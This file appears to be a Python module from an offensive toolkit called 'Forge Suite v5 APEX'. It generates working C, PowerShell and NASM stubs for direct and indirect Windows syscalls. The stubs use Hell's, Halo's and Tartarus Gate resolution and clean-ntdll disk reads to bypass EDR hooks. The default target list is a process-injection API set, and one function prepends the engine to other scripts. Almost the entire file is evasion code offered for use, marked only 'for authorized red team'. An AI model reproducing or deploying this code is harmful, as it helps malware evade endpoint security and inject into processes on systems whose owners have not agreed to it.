"""Direct & Indirect Syscall Engine — bypass EDR userland API hooks.

Generates syscall stubs that invoke Nt* functions directly via the
syscall instruction, bypassing any inline hooks placed by EDR agents
in ntdll.dll.  Implements three resolution strategies:

    1. Hell's Gate   — read syscall numbers from the in-memory ntdll
    2. Halo's Gate   — neighbour-walk when the target SSN is hooked
    3. Tartarus Gate — bi-directional walk for heavily hooked ntdlls
    4. Disk Read     — parse clean ntdll from disk as fallback

Supports both direct syscalls (syscall instruction in our stub) and
indirect syscalls (jmp into the legitimate ntdll syscall;ret gadget
so the return address looks clean to stack-walking EDR).

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class SyscallMode(Enum):
    """Syscall invocation mode."""
    DIRECT = "direct"
    INDIRECT = "indirect"


class ResolutionStrategy(Enum):
    """SSN (System Service Number) resolution strategy."""
    HELLS_GATE = "hells_gate"
    HALOS_GATE = "halos_gate"
    TARTARUS_GATE = "tartarus_gate"
    DISK_READ = "disk_read"
    COMBINED = "combined"


@dataclass
class SyscallStubConfig:
    """Configuration for syscall stub generation."""
    mode:              SyscallMode = SyscallMode.INDIRECT
    resolution:        ResolutionStrategy = ResolutionStrategy.COMBINED
    target_functions:  list[str] = field(default_factory=lambda: [
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtClose",
        "NtQueryInformationProcess",
        "NtCreateSection",
        "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtQueueApcThread",
        "NtResumeThread",
        "NtWaitForSingleObject",
        "NtFreeVirtualMemory",
        "NtReadVirtualMemory",
        "NtSetInformationThread",
        "NtDelayExecution",
    ])
    randomize_stub_order: bool = True
    obfuscate_ssn:        bool = True
    use_syscall_via_eax:  bool = True
    add_junk_instructions: bool = True
    hash_function_names:   bool = True

    def to_dict(self) -> dict[str, Any]:
        return {
            "mode": self.mode.value,
            "resolution": self.resolution.value,
            "target_functions": self.target_functions,
            "randomize_stub_order": self.randomize_stub_order,
            "obfuscate_ssn": self.obfuscate_ssn,
            "use_syscall_via_eax": self.use_syscall_via_eax,
            "add_junk_instructions": self.add_junk_instructions,
            "hash_function_names": self.hash_function_names,
        }


# Known SSNs for common Windows 10/11 builds (fallback when runtime resolution fails)
# These are publicly documented in syscall tables and j00ru's research.
KNOWN_SSNS: dict[str, dict[str, int]] = {
    "win10_21H2": {
        "NtAllocateVirtualMemory": 0x18,
        "NtProtectVirtualMemory": 0x50,
        "NtWriteVirtualMemory": 0x3A,
        "NtCreateThreadEx": 0xC7,
        "NtOpenProcess": 0x26,
        "NtClose": 0x0F,
        "NtQueryInformationProcess": 0x19,
        "NtCreateSection": 0x4A,
        "NtMapViewOfSection": 0x28,
        "NtUnmapViewOfSection": 0x2A,
        "NtQueueApcThread": 0x45,
        "NtResumeThread": 0x52,
        "NtWaitForSingleObject": 0x04,
        "NtFreeVirtualMemory": 0x1E,
        "NtReadVirtualMemory": 0x3F,
        "NtSetInformationThread": 0x0D,
        "NtDelayExecution": 0x34,
    },
    "win11_23H2": {
        "NtAllocateVirtualMemory": 0x18,
        "NtProtectVirtualMemory": 0x50,
        "NtWriteVirtualMemory": 0x3A,
        "NtCreateThreadEx": 0xC9,
        "NtOpenProcess": 0x26,
        "NtClose": 0x0F,
        "NtQueryInformationProcess": 0x19,
        "NtCreateSection": 0x4A,
        "NtMapViewOfSection": 0x28,
        "NtUnmapViewOfSection": 0x2A,
        "NtQueueApcThread": 0x45,
        "NtResumeThread": 0x52,
        "NtWaitForSingleObject": 0x04,
        "NtFreeVirtualMemory": 0x1E,
        "NtReadVirtualMemory": 0x3F,
        "NtSetInformationThread": 0x0D,
        "NtDelayExecution": 0x34,
    },
}


# ═══════════════════════════════════════════════════════════════════
#  C STUBS
# ═══════════════════════════════════════════════════════════════════

_C_HELLS_GATE_RESOLVER = r"""
// Forge Suite v5 APEX — Hell's Gate SSN Resolver
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
// Technique: T1106 (Native API)
// References: am0nsec/HellsGate, trickster0/TartarusGate
#include <windows.h>

typedef struct _VX_TABLE_ENTRY {
    PVOID  pAddress;
    DWORD  dwHash;
    WORD   wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

// DJB2 hash for API name resolution — avoids plaintext strings
static DWORD djb2_hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

// Walk PEB → InMemoryOrderModuleList → find ntdll base
static PVOID get_ntdll_base(void) {
    #ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    #else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
    #endif
    PLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    // Skip exe (first), then ntdll is second in load order
    curr = curr->Flink;
    PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr,
        LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return entry->DllBase;
}

// Resolve SSN from in-memory ntdll export — Hell's Gate
// Pattern: 4C 8B D1 B8 XX XX 00 00 (mov r10,rcx; mov eax,SSN)
static BOOL hells_gate_resolve(PVOID ntdll_base, DWORD func_hash,
                                PVX_TABLE_ENTRY entry) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll_base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)ntdll_base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    PDWORD names    = (PDWORD)((BYTE*)ntdll_base + exports->AddressOfNames);
    PDWORD funcs    = (PDWORD)((BYTE*)ntdll_base + exports->AddressOfFunctions);
    PWORD  ordinals = (PWORD)((BYTE*)ntdll_base + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char *)((BYTE*)ntdll_base + names[i]);
        if (djb2_hash(name) != func_hash) continue;

        entry->pAddress = (PVOID)((BYTE*)ntdll_base + funcs[ordinals[i]]);
        entry->dwHash   = func_hash;

        BYTE *p = (BYTE*)entry->pAddress;

        // Clean stub: 4C 8B D1 B8 [SSN_LO] [SSN_HI] 00 00
        if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 &&
            p[3] == 0xB8) {
            entry->wSystemCall = *(WORD*)(p + 4);
            return TRUE;
        }

        // Halo's Gate — hooked, walk neighbours
        // Check if starts with JMP (0xE9) — inline hook indicator
        if (p[0] == 0xE9 || p[0] == 0xFF) {
            // Walk UP: check SSN-1, SSN-2, ... in 32-byte increments
            for (int offset = 1; offset < 32; offset++) {
                BYTE *neighbour = p - (offset * 32);
                if (neighbour[0] == 0x4C && neighbour[1] == 0x8B &&
                    neighbour[2] == 0xD1 && neighbour[3] == 0xB8) {
                    entry->wSystemCall = *(WORD*)(neighbour + 4) + (WORD)offset;
                    return TRUE;
                }
            }
            // Walk DOWN: check SSN+1, SSN+2, ...
            for (int offset = 1; offset < 32; offset++) {
                BYTE *neighbour = p + (offset * 32);
                if (neighbour[0] == 0x4C && neighbour[1] == 0x8B &&
                    neighbour[2] == 0xD1 && neighbour[3] == 0xB8) {
                    entry->wSystemCall = *(WORD*)(neighbour + 4) - (WORD)offset;
                    return TRUE;
                }
            }
        }
        return FALSE;
    }
    return FALSE;
}
"""

_C_DIRECT_SYSCALL_STUB = r"""
// Forge Suite v5 APEX — Direct Syscall Stub (x64)
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
// The syscall instruction executes in our code — return address points here
// Pros: No ntdll hooks can intercept
// Cons: Return address is in non-ntdll memory (detectable by stack-walking EDR)

// NASM-style inline assembly for MSVC
// For GCC/Clang, use __asm__ volatile

extern WORD wSyscallNumber;  // Resolved at runtime via Hell's/Halo's Gate

__declspec(naked) NTSTATUS DirectSyscall(void) {
    __asm {
        mov r10, rcx          ; First arg to r10 (Windows x64 syscall ABI)
        mov eax, wSyscallNumber
        syscall
        ret
    }
}

// Macro generator — one stub per Nt function
#define DEFINE_DIRECT_SYSCALL(name, ssn_var)  \
    __declspec(naked) NTSTATUS name##_direct(void) { \
        __asm { mov r10, rcx }  \
        __asm { mov eax, ssn_var } \
        __asm { syscall } \
        __asm { ret } \
    }
"""

_C_INDIRECT_SYSCALL_STUB = r"""
// Forge Suite v5 APEX — Indirect Syscall Stub (x64)
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
// Instead of executing 'syscall' in our memory, we JMP to the legitimate
// syscall;ret gadget inside ntdll.dll so the return address on the stack
// points back into ntdll — passes stack-walking EDR checks.

// Technique: Find "syscall; ret" (0F 05 C3) gadget in ntdll .text section
// then JMP to it after setting up r10/eax.

extern WORD  wSyscallNumber;
extern PVOID pSyscallRetGadget;  // Points to 0F 05 C3 in ntdll

// Find syscall;ret gadget in ntdll .text section
static PVOID find_syscall_ret_gadget(PVOID ntdll_base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll_base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            BYTE *start = (BYTE*)ntdll_base + sec[i].VirtualAddress;
            DWORD size  = sec[i].Misc.VirtualSize;
            // Scan for 0F 05 C3 (syscall; ret)
            for (DWORD j = 0; j < size - 2; j++) {
                if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3) {
                    return &start[j];
                }
            }
        }
    }
    return NULL;
}

__declspec(naked) NTSTATUS IndirectSyscall(void) {
    __asm {
        mov r10, rcx
        mov eax, wSyscallNumber
        jmp pSyscallRetGadget     ; Jump into ntdll's syscall;ret
    }
}

#define DEFINE_INDIRECT_SYSCALL(name, ssn_var, gadget_var) \
    __declspec(naked) NTSTATUS name##_indirect(void) { \
        __asm { mov r10, rcx } \
        __asm { mov eax, ssn_var } \
        __asm { jmp gadget_var } \
    }
"""

_C_DISK_READ_RESOLVER = r"""
// Forge Suite v5 APEX — Disk-Read SSN Resolver
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
// Reads a clean copy of ntdll.dll from disk (not hooked by EDR)
// and parses the export table to extract SSNs.

#include <windows.h>

static BOOL disk_read_resolve(const char *func_name, PWORD out_ssn) {
    // Open clean ntdll from System32
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD file_size = GetFileSize(hFile, NULL);
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return FALSE; }

    LPVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(hMap); CloseHandle(hFile); return FALSE; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);

    // Walk exports
    DWORD export_rva = nt->OptionalHeader.DataDirectory[
        IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    // Convert RVA to file offset
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    DWORD export_offset = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (export_rva >= sec[i].VirtualAddress &&
            export_rva < sec[i].VirtualAddress + sec[i].SizeOfRawData) {
            export_offset = export_rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
            break;
        }
    }

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + export_offset);

    // RVA-to-offset helper macro
    #define RVA2OFF(rva) ({ \
        DWORD _off = 0; \
        for (WORD _i = 0; _i < nt->FileHeader.NumberOfSections; _i++) { \
            if ((rva) >= sec[_i].VirtualAddress && \
                (rva) < sec[_i].VirtualAddress + sec[_i].SizeOfRawData) { \
                _off = (rva) - sec[_i].VirtualAddress + sec[_i].PointerToRawData; \
                break; \
            } \
        } _off; })

    PDWORD names    = (PDWORD)((BYTE*)base + RVA2OFF(exports->AddressOfNames));
    PDWORD funcs    = (PDWORD)((BYTE*)base + RVA2OFF(exports->AddressOfFunctions));
    PWORD  ordinals = (PWORD)((BYTE*)base + RVA2OFF(exports->AddressOfNameOrdinals));

    BOOL found = FALSE;
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char *)((BYTE*)base + RVA2OFF(names[i]));
        if (strcmp(name, func_name) != 0) continue;

        BYTE *stub = (BYTE*)base + RVA2OFF(funcs[ordinals[i]]);
        // Pattern: 4C 8B D1 B8 [SSN_LO] [SSN_HI] 00 00
        if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
            stub[3] == 0xB8) {
            *out_ssn = *(WORD*)(stub + 4);
            found = TRUE;
        }
        break;
    }
    #undef RVA2OFF

    UnmapViewOfFile(base);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return found;
}
"""

# ═══════════════════════════════════════════════════════════════════
#  POWERSHELL STUBS
# ═══════════════════════════════════════════════════════════════════

_PS1_SYSCALL_STUB = r"""
# Forge Suite v5 APEX — Syscall Engine (PowerShell)
# FOR AUTHORIZED RED TEAM OPERATIONS ONLY
# Uses D/Invoke-style delegates to call Nt* functions directly

# Get ntdll base from PEB
$ntdll = [System.Diagnostics.Process]::GetCurrentProcess().Modules |
    Where-Object { $_.ModuleName -eq 'ntdll.dll' } | Select-Object -First 1

function Get-SyscallNumber {
    param([string]$FunctionName)

    $ntdllBase = $ntdll.BaseAddress
    # Parse PE exports to find the function
    $dosHeader = [System.Runtime.InteropServices.Marshal]::ReadInt32($ntdllBase, 0x3C)
    $exportRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32(
        [IntPtr]::Add($ntdllBase, $dosHeader + 0x88), 0)

    if ($exportRVA -eq 0) { return -1 }

    $exportDir = [IntPtr]::Add($ntdllBase, $exportRVA)
    $numNames = [System.Runtime.InteropServices.Marshal]::ReadInt32($exportDir, 24)
    $namesRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($exportDir, 32)
    $funcsRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($exportDir, 28)
    $ordinalsRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($exportDir, 36)

    for ($i = 0; $i -lt $numNames; $i++) {
        $nameRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32(
            [IntPtr]::Add($ntdllBase, $namesRVA + ($i * 4)), 0)
        $name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(
            [IntPtr]::Add($ntdllBase, $nameRVA))

        if ($name -eq $FunctionName) {
            $ordinal = [System.Runtime.InteropServices.Marshal]::ReadInt16(
                [IntPtr]::Add($ntdllBase, $ordinalsRVA + ($i * 2)), 0)
            $funcRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32(
                [IntPtr]::Add($ntdllBase, $funcsRVA + ($ordinal * 4)), 0)
            $funcAddr = [IntPtr]::Add($ntdllBase, $funcRVA)

            # Read first 8 bytes — check for syscall pattern
            $b0 = [System.Runtime.InteropServices.Marshal]::ReadByte($funcAddr, 0)
            $b1 = [System.Runtime.InteropServices.Marshal]::ReadByte($funcAddr, 1)
            $b2 = [System.Runtime.InteropServices.Marshal]::ReadByte($funcAddr, 2)
            $b3 = [System.Runtime.InteropServices.Marshal]::ReadByte($funcAddr, 3)

            # 4C 8B D1 B8 = mov r10,rcx; mov eax,SSN
            if ($b0 -eq 0x4C -and $b1 -eq 0x8B -and $b2 -eq 0xD1 -and $b3 -eq 0xB8) {
                return [System.Runtime.InteropServices.Marshal]::ReadInt16($funcAddr, 4)
            }

            # Hooked — check neighbours (Halo's Gate)
            # Walk UP (lower SSNs)
            for ($off = 1; $off -lt 32; $off++) {
                $nAddr = [IntPtr]::Add($funcAddr, -($off * 32))
                $nb0 = [System.Runtime.InteropServices.Marshal]::ReadByte($nAddr, 0)
                $nb3 = [System.Runtime.InteropServices.Marshal]::ReadByte($nAddr, 3)
                if ($nb0 -eq 0x4C -and $nb3 -eq 0xB8) {
                    $ssn = [System.Runtime.InteropServices.Marshal]::ReadInt16($nAddr, 4)
                    return $ssn + $off
                }
            }
            # Walk DOWN (higher SSNs) — Tartarus Gate
            for ($off = 1; $off -lt 32; $off++) {
                $nAddr = [IntPtr]::Add($funcAddr, ($off * 32))
                $nb0 = [System.Runtime.InteropServices.Marshal]::ReadByte($nAddr, 0)
                $nb3 = [System.Runtime.InteropServices.Marshal]::ReadByte($nAddr, 3)
                if ($nb0 -eq 0x4C -and $nb3 -eq 0xB8) {
                    $ssn = [System.Runtime.InteropServices.Marshal]::ReadInt16($nAddr, 4)
                    return $ssn - $off
                }
            }
            return -1
        }
    }
    return -1
}

# Example usage:
# $ssn = Get-SyscallNumber -FunctionName "NtAllocateVirtualMemory"
# Write-Host "[+] NtAllocateVirtualMemory SSN: 0x$($ssn.ToString('X4'))"
"""

# ═══════════════════════════════════════════════════════════════════
#  PYTHON EMULATION STUB
# ═══════════════════════════════════════════════════════════════════

_PYTHON_SYSCALL_STUB = """\
\"\"\"Syscall number reference and resolution emulation.

This module provides SSN lookup tables for testing and validation.
Actual syscall invocation requires native code — this is for planning
and attack chain simulation only.
\"\"\"

# Public SSN tables from j00ru/windows-syscalls and hfiref0x/SyscallTables
SSNS_WIN10_21H2 = {
    "NtAllocateVirtualMemory": 0x18,
    "NtProtectVirtualMemory":  0x50,
    "NtWriteVirtualMemory":    0x3A,
    "NtCreateThreadEx":        0xC7,
    "NtOpenProcess":           0x26,
    "NtClose":                 0x0F,
    "NtCreateSection":         0x4A,
    "NtMapViewOfSection":      0x28,
    "NtUnmapViewOfSection":    0x2A,
    "NtQueueApcThread":        0x45,
    "NtResumeThread":          0x52,
    "NtWaitForSingleObject":   0x04,
    "NtFreeVirtualMemory":     0x1E,
    "NtReadVirtualMemory":     0x3F,
    "NtSetInformationThread":  0x0D,
    "NtDelayExecution":        0x34,
}

def resolve_ssn(func_name: str, build: str = "win10_21H2") -> int | None:
    \"\"\"Look up a syscall number by function name and Windows build.\"\"\"
    table = SSNS_WIN10_21H2  # Extend with more builds as needed
    return table.get(func_name)

def validate_stub_pattern(stub_bytes: bytes) -> dict:
    \"\"\"Validate a syscall stub matches expected patterns.\"\"\"
    result = {"valid": False, "hooked": False, "ssn": None}
    if len(stub_bytes) < 8:
        return result
    # Check for mov r10,rcx; mov eax,SSN
    if stub_bytes[0:4] == b'\\x4c\\x8b\\xd1\\xb8':
        result["valid"] = True
        result["ssn"] = int.from_bytes(stub_bytes[4:6], "little")
    # Check for JMP (hook indicator)
    elif stub_bytes[0] == 0xE9 or stub_bytes[0] == 0xFF:
        result["hooked"] = True
    return result

if __name__ == '__main__':
    for name, ssn in sorted(SSNS_WIN10_21H2.items()):
        print(f"  {name:<35} SSN=0x{ssn:04X}")
    print(f"\\n[+] {len(SSNS_WIN10_21H2)} syscall numbers loaded")
"""


# ═══════════════════════════════════════════════════════════════════
#  NASM STUBS — for position-independent shellcode
# ═══════════════════════════════════════════════════════════════════

_NASM_DIRECT_SYSCALL = r"""
; Forge Suite v5 APEX — Direct Syscall (NASM x64)
; FOR AUTHORIZED RED TEAM OPERATIONS ONLY
; Assemble: nasm -f win64 syscall_direct.asm -o syscall_direct.o

section .text
global NtAllocateVirtualMemory_Direct

; SSN passed in r11 before call
NtAllocateVirtualMemory_Direct:
    mov r10, rcx              ; Standard Windows syscall ABI
    mov eax, {SSN}            ; System Service Number (patched at build time)
    syscall
    ret
"""

_NASM_INDIRECT_SYSCALL = r"""
; Forge Suite v5 APEX — Indirect Syscall (NASM x64)
; FOR AUTHORIZED RED TEAM OPERATIONS ONLY
; JMPs to ntdll's syscall;ret gadget to keep return address clean

section .text
global NtAllocateVirtualMemory_Indirect

; SSN in r11, gadget address in r12 (set by resolver before call)
NtAllocateVirtualMemory_Indirect:
    mov r10, rcx
    mov eax, {SSN}
    jmp qword [{GADGET_ADDR}]   ; Jump to ntdll's 0F 05 C3 sequence
"""


# ═══════════════════════════════════════════════════════════════════
#  PUBLIC API
# ═══════════════════════════════════════════════════════════════════

def get_syscall_stub(
    config: SyscallStubConfig | None = None,
    lang: str = "c",
) -> str:
    """Return syscall engine code for the specified language.

    Args:
        config: SyscallStubConfig or None for defaults.
        lang:   Target language ('c', 'ps1', 'python', 'nasm').

    Returns:
        Code string with resolver + syscall stubs.
    """
    config = config or SyscallStubConfig()
    valid_langs = {"c", "ps1", "python", "nasm"}
    if lang not in valid_langs:
        raise ValueError(f"Unknown lang '{lang}', expected one of {valid_langs}")

    if lang == "ps1":
        return _PS1_SYSCALL_STUB
    if lang == "python":
        return _PYTHON_SYSCALL_STUB

    if lang == "nasm":
        if config.mode == SyscallMode.INDIRECT:
            return _NASM_INDIRECT_SYSCALL
        return _NASM_DIRECT_SYSCALL

    # C — combine resolver + stub based on config
    parts = []

    # Always include the resolver
    if config.resolution in (ResolutionStrategy.HELLS_GATE,
                             ResolutionStrategy.HALOS_GATE,
                             ResolutionStrategy.TARTARUS_GATE,
                             ResolutionStrategy.COMBINED):
        parts.append(_C_HELLS_GATE_RESOLVER)

    if config.resolution in (ResolutionStrategy.DISK_READ, ResolutionStrategy.COMBINED):
        parts.append(_C_DISK_READ_RESOLVER)

    # Add the appropriate syscall stub
    if config.mode == SyscallMode.INDIRECT:
        parts.append(_C_INDIRECT_SYSCALL_STUB)
    else:
        parts.append(_C_DIRECT_SYSCALL_STUB)

    return "\n".join(parts)


def inject_syscall_engine(
    script: str,
    config: SyscallStubConfig | None = None,
    lang: str = "c",
) -> str:
    """Prepend syscall engine code to an existing script.

    Args:
        script: Existing source code.
        config: Configuration.
        lang:   Target language.

    Returns:
        Script with syscall engine prepended.
    """
    stub = get_syscall_stub(config, lang)
    return stub + "\n" + script


def generate_syscall_config(config: SyscallStubConfig | None = None) -> dict[str, Any]:
    """Generate complete syscall engine configuration with stubs.

    Args:
        config: SyscallStubConfig or None for defaults.

    Returns:
        Dict with config, SSN tables, and code stubs.
    """
    config = config or SyscallStubConfig()
    return {
        "config": config.to_dict(),
        "known_ssns": KNOWN_SSNS,
        "stubs": {
            "c": get_syscall_stub(config, "c"),
            "ps1": get_syscall_stub(config, "ps1"),
            "python": get_syscall_stub(config, "python"),
            "nasm_direct": get_syscall_stub(
                SyscallStubConfig(mode=SyscallMode.DIRECT), "nasm"),
            "nasm_indirect": get_syscall_stub(
                SyscallStubConfig(mode=SyscallMode.INDIRECT), "nasm"),
        },
    }


def list_resolution_strategies() -> list[dict[str, str]]:
    """Return available SSN resolution strategies with descriptions."""
    return [
        {"strategy": "hells_gate", "reliability": "high",
         "notes": "Read SSN from in-memory ntdll — fails if stub is hooked"},
        {"strategy": "halos_gate", "reliability": "high",
         "notes": "Neighbour-walk when target SSN is hooked — works on most EDRs"},
        {"strategy": "tartarus_gate", "reliability": "highest",
         "notes": "Bi-directional walk — handles heavily hooked ntdlls"},
        {"strategy": "disk_read", "reliability": "medium",
         "notes": "Read clean ntdll from disk — detected by some file-monitoring EDRs"},
        {"strategy": "combined", "reliability": "highest",
         "notes": "Try Hell's Gate → Halo's Gate → disk read as fallback chain"},
    ]


def list_supported_functions() -> list[str]:
    """Return the list of Nt* functions supported by the syscall engine."""
    return SyscallStubConfig().target_functions
